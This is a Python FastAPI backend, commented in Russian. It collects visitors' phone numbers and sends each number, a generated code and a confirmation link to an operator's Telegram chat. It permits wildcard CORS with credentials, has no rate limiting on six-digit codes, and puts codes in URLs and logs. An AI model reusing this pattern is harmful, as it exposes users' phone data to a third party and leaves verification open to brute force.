import os
import secrets
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx

app = FastAPI()

# CORS для Netlify
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Хранилище сессий в памяти
sessions = {}

class SendCodeRequest(BaseModel):
    phone: str

class VerifyRequest(BaseModel):
    sessionId: str
    code: str

# Очистка старых сессий (каждые 5 минут)
def clean_expired_sessions():
    now = datetime.now()
    expired = [sid for sid, sess in sessions.items() if sess["expires_at"] < now]
    for sid in expired:
        del sessions[sid]

# API: отправка кода
@app.post("/api/send-code")
async def send_code(request: SendCodeRequest):
    phone = request.phone
    if not phone:
        raise HTTPException(status_code=400, detail="Phone required")
    
    code = str(secrets.randbelow(900000) + 100000)
    session_id = secrets.token_hex(16)
    
    # Сохраняем в память
    sessions[session_id] = {
        "phone": phone,
        "code": code,
        "verified": False,
        "expires_at": datetime.now() + timedelta(minutes=15)
    }
    
    # Очистка старых сессий
    clean_expired_sessions()
    
    site_url = os.getenv("SITE_URL", "https://твой-сайт.netlify.app")
    sent = await send_telegram(phone, code, session_id, site_url)
    
    return {"success": sent, "sessionId": session_id}

# API: проверка статуса
@app.get("/api/check-session/{session_id}")
async def check_session(session_id: str):
    clean_expired_sessions()
    session = sessions.get(session_id)
    
    if session:
        return {"verified": session["verified"]}
    return {"verified": False}

# API: авто-верификация
@app.post("/api/auto-verify")
async def auto_verify(request: VerifyRequest):
    clean_expired_sessions()
    session = sessions.get(request.sessionId)
    
    if session and session["code"] == request.code and not session["verified"]:
        session["verified"] = True
        return {"success": True}
    
    return {"success": False}

# API: статистика
@app.get("/api/stats")
async def get_stats():
    clean_expired_sessions()
    verified_count = sum(1 for sess in sessions.values() if sess["verified"])
    return {"total": verified_count}

# Health check
@app.get("/health")
async def health():
    return {"status": "ok"}

# Отправка в Telegram
async def send_telegram(phone: str, code: str, session_id: str, site_url: str):
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    
    if not bot_token or not chat_id:
        print(f"DEMO: {phone} -> code {code}")
        print(f"Link: {site_url}/?sessionId={session_id}&code={code}")
        return True
    
    link = f"{site_url}/?sessionId={session_id}&code={code}"
    message = f"🔐 НОВЫЙ ЗАПРОС\n📱 {phone}\n🔑 {code}\n✅ [ПОДТВЕРДИТЬ]({link})"
    
    async with httpx.AsyncClient() as client:
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            resp = await client.post(url, json={
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "Markdown"
            })
            return resp.json().get("ok", False)
        except Exception as e:
            print(f"Telegram error: {e}")
            return False

@app.on_event("startup")
async def startup():
    print("🚀 Server running without PostgreSQL")
    print("📊 Sessions stored in memory")

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
